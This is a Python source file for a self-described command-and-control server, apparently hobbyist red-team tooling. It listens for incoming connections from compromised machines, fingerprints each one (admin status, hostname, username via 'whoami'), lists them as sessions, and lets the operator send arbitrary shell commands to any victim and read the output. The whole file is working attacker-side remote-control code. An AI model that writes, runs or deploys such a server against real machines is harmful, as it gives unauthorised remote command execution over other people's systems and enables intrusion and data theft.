import socket
import sys
import threading
from prettytable import PrettyTable
import time
from datetime import datetime

def print_banner():
    print("   ________               __     __  ")       
    print("  / ____/ /_  ____  _____/ /_    \ \      ")  
    print(" / / __/ __ \/ __ \/ ___/ __/     \ \   ")    
    print("/ /_/ / / / / /_/ (__  ) /_       / /       ")
    print("\____/_/ /_/\____/____/\__/      /_/  ______")
    print("                                     /_____/")
    print("Custom Command And Control Server")
    print("By SafeAndSound - v. 1.0\n")

def send_message(target_id, message):
    message = str(message)
    target_id.send(message.encode())

def recieve_message(target_id) :
    response = target_id.recv(4096).decode(errors="replace")
    return response

def get_last_client_username(list_of_targets):
    target_id = list_of_targets[-1][0]
    target_ip = list_of_targets[-1][1]
    send_message(target_id, "whoami")
    user_id = recieve_message(target_id).rstrip("\n")
    if len(user_id.split()) > 5:
        print(f"[-] Warning : couldn't resolve user id for {target_ip}.\n")
        user_id = "[unresolved]"
    list_of_targets[-1].append(user_id) 

def handle_single_target_communication(target_index, list_of_targets):
    target_id = list_of_targets[target_index][0]
    target_ip = list_of_targets[target_index][1]
    user_id = list_of_targets[target_index][5]
    while True:
        try:
            message = input(f"{user_id}@{target_ip}#> ")
            # void command
            if message == "":
                pass
            # background command  
            if message == "bg":
                print("\n[+] Moving current session to the background.\n")
                break 
            # exit command
            if message == "exit":
                send_message(target_id, message)
                print("\n[-] sending kill signal...")
                target_id.close()
                del list_of_targets[target_index]
                print("[-] Connection closed.\n")
                break     
            # commands to be sent to client
            else :      
                send_message(target_id, message)
                response = recieve_message(target_id)
                if response == "exit":
                    print("[-] The client has terminated the session.")
                    target_id.close()
                    del list_of_targets[target_index]
                    break
                print(response)
        except KeyboardInterrupt:
            print("\n\nKeyboard interrupt issued.\n")
            send_message(target_id, "exit")
            print("\n[-] sending kill signal...")
            target_id.close()
            del list_of_targets[target_index]
            print("[-] Connection closed.\n")
            break
        except Exception:
            communication_socket.close()
            break

def close_all_connections(list_of_targets):
    print("\n[-] Closing...\n")
    for target in list_of_targets:
        send_message(target[0], "exit")
    communication_socket.close()

"""
List of supported commands for server_cli:
sessions, cd, ls, exit
"""
def handle_server_cli_commands(list_of_targets):
    command = input("Enter_command#> ").strip()
    # void command
    if command == "":
        pass
    # "sessions" without arguments
    elif command.strip() == "listeners":
        host_ip = input("[+] Enter the IP to listen on : ")
        host_port = input("[+] Enter the port to listen on : ")
        prepare_socket_thread(host_ip, host_port)
    elif (command.split()[0] == "sessions") and (len(command.split()) == 1):
        print("Usage : sessions [flag] [value]")
        print("    -l           list all sessions")
        print("    -i <num>     interact with session number <num>")
        print("")
    # "sessions -l" (and alias "ls")
    elif ((command.split()[0] == "sessions") and (command.split()[1] == "-l")) or (command == "ls"):
        session_counter = 1
        sessions_table = PrettyTable()
        sessions_table.field_names = ["Session", "Target", "Username", "Admin", "Status", "Check-in time"]
        sessions_table.padding_width = 3
        for target in list_of_targets:
            fullname = str(target[1])
            if target[3] is not None:
                fullname = str(target[3]) + "@" + fullname
            # list_of_targets structure : list with 
            #                               [0]target_id 
            #                               [1]target_ip 
            #                               [2]time_record 
            #                               [3]hostname 
            #                               [4]is_admin
            #                               [5]username
            sessions_table.add_row([session_counter, fullname, target[5], target[4], "", target[2]])
            session_counter += 1
        print(f"{sessions_table}\n")
    # "sessions -i <num>"
    elif (command.split()[0] == "sessions") and (command.split()[1] == "-i"):
        try:
            num = int(command.split()[2]) - 1
            if 0 <= num < len(list_of_targets):
                print(f"\n[+] Entering session {num+1}...\n")
                handle_single_target_communication(num, list_of_targets)
            else:
                print("Out of bound value provided. Use 'sessions -l' to list sessions.\n")
        except IndexError:
            print("Missing argument. Usage : 'sessions -i <session_number>'\n")
        except ValueError:
            print("Value provided is not an integer.\n")
    # "cd" alias for "sessions -i"
    elif command.split()[0] == "cd":
        try:
            num = int(command.split()[1]) - 1
            if 0 <= num < len(list_of_targets):
                print(f"\n[+] Entering session {num+1}...\n")
                handle_single_target_communication(num, list_of_targets)
            else:
                print("Out of bound value provided. Use 'sessions -l' or 'ls' to list sessions.\n")
        except IndexError:
            print("Missing argument. Usage : 'cd <session_number>'\n")
        except ValueError:
            print("Value provided is not an integer.\n")
    # "exit"
    elif command == "exit":
        close_all_connections(list_of_targets)
        return False
    # unknown commands
    else:
        print("Unkown command. Type 'help' for a list of accepted commands.\n")
    return True

def run_server_cli(list_of_targets):
    running = True
    while running:
        try:
            running = handle_server_cli_commands(list_of_targets)
        except KeyboardInterrupt:
            print("\n\n[-] Keyboard interrupt was issued.")
            close_all_connections(list_of_targets)
            break

def welcome_new_connections():
    while True:
        try:
            new_target, new_ip = communication_socket.accept()
            admin = recieve_message(new_target)
            is_admin = False
            if (admin.split()[0] == "Linux") and (admin.split()[1] == "0"):
                is_admin = True
            elif admin == "1":
                is_admin = True
            hour_of_connection = time.strftime("%H:%M:%S", time.localtime())
            date_of_connection = datetime.now()
            time_record = (f"{date_of_connection.day}/{date_of_connection.month}/{date_of_connection.year} {hour_of_connection}")
            try:
                hostname = socket.gethostbyaddr(new_ip[0])[0]
            except Exception:
                print(f"\n[-] Couldn't resolve hostname for client {new_ip[0]}.")
                hostname = "[unresolved]"
            # TODO Change this data structure to make it more explicit ?
            list_of_targets.append([new_target, new_ip[0], time_record, hostname, is_admin])
            get_last_client_username(list_of_targets)
            print(f"\n[+] Connection recieved from {new_ip[0]}.")
            print(f"    \___ time of connection : {time_record}")
            print(f"    \___ port used on the client : {new_ip[1]}\n\nEnter_command#> ", end="")
        except Exception:
            communication_socket.close()
            break

def prepare_socket_thread(host_ip, host_port):
    communication_socket.bind((host_ip, int(host_port)))
    print("[+] Awaiting connection from client...\n")
    communication_socket.listen()
    t1 = threading.Thread(target=welcome_new_connections)
    t1.start()

if __name__ == "__main__":
    print_banner()
    list_of_targets = []
    try:
        communication_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        # So far the server can only listen on one network interface
        # HOST_IP = "172.17.176.1"
        # # HOST_IP = "127.0.0.1"
        # HOST_PORT = 4444
        # prepare_socket_thread(HOST_IP, HOST_PORT)
        run_server_cli(list_of_targets)
    except IndexError:
        print("[-] Command line argument(s) missing.")
        print("[!] Usage : python3 sockserver.py ip_address port")
    except Exception as error:
        print(f"An error occured : {error}")